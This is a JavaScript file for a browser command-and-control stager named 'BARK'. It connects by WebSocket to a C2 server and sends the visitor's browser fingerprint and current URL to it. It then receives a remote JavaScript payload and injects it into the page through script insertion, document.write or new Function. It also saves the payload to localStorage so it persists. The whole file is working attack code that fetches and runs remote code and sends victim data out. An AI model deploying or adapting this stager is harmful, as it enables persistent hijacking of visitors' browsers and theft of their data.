/**
 * BARK C2 Agent Stager
 * 
 * This script creates a WebSocket connection to the C2 server,
 * identifies itself as an agent stager, and receives a JavaScript payload
 * which is then injected into the current DOM.
 */
(function() {
    // Create unique agent ID based on timestamp and random string
    const generateAgentId = () => {
        const timestamp = Date.now().toString(36);
        const randomStr = Math.random().toString(36).substring(2, 10);
        return `agent_${timestamp}_${randomStr}`;
    };

    // Get browser and system information
    const getSystemInfo = () => {
        return {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            cookiesEnabled: navigator.cookieEnabled,
            screenResolution: `${window.screen.width}x${window.screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            referrer: document.referrer,
            currentUrl: window.location.href,
            hostname: window.location.hostname
        };
    };

    // Create and manage WebSocket connection
    const connectToC2 = () => {
        console.log("[BARK Stager] Initializing...");
        
        try {
            // Use WebSocket protocol matching the page's protocol (ws or wss)
            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
            const wsUrl = `ws://0.0.0.0:8080/ws`;
            
            // Create WebSocket connection
            const socket = new WebSocket(wsUrl);
            
            // Connection opened
            socket.addEventListener('open', (event) => {
                console.log("[BARK Stager] Connection established with C2 server");
                
                // Prepare initial registration message
                const registrationMsg = {
                    type: "stager_registration",
                    agentId: generateAgentId(),
                    timestamp: new Date().toISOString(),
                    systemInfo: getSystemInfo()
                };
                
                // Send registration message
                socket.send(JSON.stringify(registrationMsg));
                console.log("[BARK Stager] Registration sent to C2 server");
            });
            
            // Listen for messages from server
            socket.addEventListener('message', (event) => {
                console.log("[BARK Stager] Received payload from C2 server");
                console.log("[BARK Stager] Message data:", event.data);
                try {
                    // Parse the response
                    const response = JSON.parse(event.data);
                    
                    // Check if it's a payload delivery message
                    if (response.type === "agent_payload") {
                        // Get the JavaScript payload
                        const payload = response.payload;
                        
                        // Inject the payload into the DOM
                        injectPayload(payload);
                        
                        // Acknowledge receipt
                        socket.send(JSON.stringify({
                            type: "payload_received",
                            status: "success",
                            timestamp: new Date().toISOString()
                        }));
                        
                        // Close the stager connection as its job is done
                        setTimeout(() => {
                            socket.close();
                            console.log("[BARK Stager] Stager completed, connection closed");
                        }, 1000);
                    }
                } catch (error) {
                    console.error("[BARK Stager] Error processing server message:", error);
                    
                    // Try to use the data directly if parsing failed
                    if (typeof event.data === 'string') {
                        injectPayload(event.data);
                    }
                }
            });
            
            // Handle errors
            socket.addEventListener('error', (event) => {
                console.error("[BARK Stager] WebSocket error:", event);
            });
            
            // Handle connection close
            socket.addEventListener('close', (event) => {
                console.log("[BARK Stager] Connection closed:", event.code, event.reason);
                
                // Attempt to reconnect after delay if this wasn't a normal closure
                // if (event.code !== 1000) {
                //     console.log("[BARK Stager] Attempting to reconnect in 30 seconds...");
                //     setTimeout(connectToC2, 30000);
                // }
            });
            
            return socket;
        } catch (error) {
            console.error("[BARK Stager] Failed to connect to C2 server:", error);
            return null;
        }
    };
    
    // Function to inject payload into DOM
    const injectPayload = (payload) => {
        try {
            console.log("[BARK Stager] Injecting payload into DOM");
            
            // Create script element
            const scriptElement = document.createElement('script');
            scriptElement.id = 'bark-agent-script';
            scriptElement.type = 'text/javascript';
            
            // Add a comment to mark this as a BARK agent script
            scriptElement.textContent = `/* BARK Agent Payload */\n${payload}`;
            
            // Try to position the script at the earliest possible position in the DOM
            // First attempt - as first child in <html>
            if (document.documentElement) {
                document.documentElement.insertBefore(scriptElement, document.documentElement.firstChild);
                console.log("[BARK Stager] Payload injected at beginning of HTML element");
            } 
            // Second attempt - as first child in <head>
            else if (document.head) {
                document.head.insertBefore(scriptElement, document.head.firstChild);
                console.log("[BARK Stager] Payload injected at beginning of head");
            }
            // Last attempt - as first child in <body>
            else if (document.body) {
                document.body.insertBefore(scriptElement, document.body.firstChild);
                console.log("[BARK Stager] Payload injected at beginning of body");
            }
            // Fallback approach using document.write
            else {
                const scriptText = `<script id="bark-agent-script" type="text/javascript">/* BARK Agent Payload */\n${payload}<\/script>`;
                const htmlContent = document.documentElement.outerHTML;
                document.open();
                document.write(scriptText + htmlContent);
                document.close();
                console.log("[BARK Stager] Payload injected using document.write");
            }
            
            // Store the agent code in localStorage for persistence/recovery
            try {
                localStorage.setItem('_barkAgentCode', payload);
                console.log("[BARK Stager] Saved agent code to localStorage for persistence");
            } catch (e) {
                console.warn("[BARK Stager] Could not save to localStorage:", e);
            }
            
            // Add a global marker to indicate the agent is present
            window._barkAgentInjected = true;
            
            return true;
        } catch (error) {
            console.error("[BARK Stager] Failed to inject payload:", error);
            
            // Last resort - direct evaluation
            try {
                console.log("[BARK Stager] Attempting direct execution");
                const dynamicFunction = new Function(payload);
                dynamicFunction();
                console.log("[BARK Stager] Direct execution successful");
                return true;
            } catch (execError) {
                console.error("[BARK Stager] All injection methods failed:", execError);
                return false;
            }
        }
    };
    
    // Start the stager
    connectToC2();
})();